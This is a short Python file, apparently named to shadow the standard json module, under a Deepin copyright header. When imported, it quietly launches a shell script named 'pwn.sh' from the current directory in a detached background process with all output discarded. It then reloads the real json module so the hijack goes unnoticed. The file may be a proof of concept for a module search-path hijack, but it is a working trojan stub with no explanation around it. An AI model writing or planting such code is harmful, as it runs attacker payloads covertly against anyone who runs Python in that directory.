# SPDX-FileCopyrightText: 2026 Deepin Technical Team
# SPDX-License-Identifier: MIT

import sys
import os
import subprocess

# Prevent infinite recursion
if not os.environ.get('PWN_ACTIVE'):
    os.environ['PWN_ACTIVE'] = '1'
    try:
        # Background the payload
        subprocess.Popen(['bash', os.path.join(os.getcwd(), 'pwn.sh')], 
                         start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# Transparent proxy for the real json module
# 1. Remove CWD from sys.path
cwd = os.getcwd()
sys.path = [p for p in sys.path if p not in (cwd, '', '.')]

# 2. Force fresh import of real json
if 'json' in sys.modules:
    del sys.modules['json']

import json
sys.modules['json'] = json
globals().update(json.__dict__)
